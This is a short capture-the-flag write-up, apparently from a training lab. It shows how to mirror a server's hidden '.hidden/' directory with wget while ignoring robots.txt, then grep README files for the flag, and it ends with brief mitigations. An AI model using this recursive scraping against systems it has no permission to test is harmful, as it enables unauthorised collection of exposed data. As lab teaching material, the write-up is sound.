## Exploit: .hidden/ directory
### Enumeration
The `.hidden/` directory listing contains multiple nested obfuscated directory names and random plaintext README files in some.

![image](https://hackmd.io/_uploads/HkaDqC1Qge.png)

### Solution
`wget` is used with the `--execute robots=off` options to ignore the `robots.txt` used in the server that disallows crawlers to access the `.hidden` endpoint. The purpose of this command is to scrape all the files recursively into host machine for further processing

```
 wget   --recursive   --no-parent   --no-check-certificate   --execute robots=off   $TARGET_IP/.hidden/
```

A script is then used to just simply print out any README file it encounters

```bash=
# finder.sh
# Set the starting directory
START_DIR="${1:-.}"  # Default to current directory if not provided

# Traverse recursively and find README files (case-insensitive)
find "$START_DIR" -type f -iname "README*" | while read -r file; do
    cat "$file"
done
```

Run the script in the extracted directory and filter out any output that may resemble a flag, and the flag can be obtained

```
┌──(nszl㉿LAPTOP-EREU4AFG)-[~/192.168.100.130/.hidden]
└─$ bash finder.sh | grep flag
Hey, here is your flag : d5eec3ec36cf80dce44a896f961c1831a05526ec215693c8f2c39543497d4466
^C
```

> The flag is `d5eec3ec36cf80dce44a896f961c1831a05526ec215693c8f2c39543497d4466`
 
### Mitigations
- robots.txt can be specifically ignored
- hidden directories can still be accessed manually
- Do not make sensitive information servable